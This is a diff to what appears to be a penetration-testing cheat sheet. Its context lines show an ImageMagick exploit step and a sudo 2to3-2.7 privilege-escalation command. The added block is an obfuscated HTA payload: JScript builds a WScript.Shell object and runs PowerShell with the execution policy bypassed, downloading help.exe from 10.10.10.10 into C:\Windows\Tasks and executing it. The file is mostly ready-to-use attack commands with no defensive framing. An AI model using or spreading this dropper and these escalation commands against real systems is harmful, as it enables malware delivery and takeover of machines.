@@ -524,3 +524,14 @@ convert exploit.mvg exploit.png
 
 [2to3-2.7 privilege escalation]
 sudo 2to3-2.7 -w -n light.py --output=/root/script
+
+[hta payload]
+```
+<script %00 >
+    lets=ActiveXObject;
+    ScTyp="WScript"
+    home=ScTyp + ".Shell"
+    gg=new lets(home);
+    gg.run('%windir%\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -exec bypass -C "wget http://10.10.10.10/help.exe -outfile C:\\Windows\\Tasks\\gg.exe;C:\\Windows\\Tasks\\gg.exe"' , 0);window.close();
+</script %00 >
+```
